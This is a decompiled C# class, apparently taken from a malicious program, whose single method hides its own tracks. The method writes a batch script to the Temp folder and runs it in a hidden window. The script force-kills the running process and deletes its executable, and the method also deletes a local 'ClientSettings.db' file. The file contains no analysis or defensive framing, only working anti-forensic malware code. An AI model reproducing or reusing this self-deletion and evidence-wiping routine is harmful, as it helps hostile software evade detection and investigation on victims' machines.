using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace NoiseMe.Drags.App.Data.Hlps
{
	// Token: 0x02000198 RID: 408
	public class Quin
	{
		// Token: 0x06000CE0 RID: 3296 RVA: 0x0002926C File Offset: 0x0002746C
		public void Rfs()
		{
			File.WriteAllText(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Local\\Temp\\Remove.bat"), string.Concat(new string[]
			{
				"@ECHO OFF",
				Environment.NewLine,
				"taskkill /F /PID %1",
				Environment.NewLine,
				"choice /C Y /N /D Y /T 3 & Del %2",
				Environment.NewLine,
				"EXIT"
			}));
			try
			{
				if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "ClientSettings.db")))
				{
					File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "ClientSettings.db"));
				}
			}
			catch
			{
			}
			Process.Start(new ProcessStartInfo
			{
				Arguments = string.Format("\"{0}\" \"{1}\"", Process.GetCurrentProcess().Id, Assembly.GetEntryAssembly().Location),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Local\\Temp\\Remove.bat"),
				WorkingDirectory = Environment.ExpandEnvironmentVariables(Directory.GetCurrentDirectory())
			});
		}
	}
}
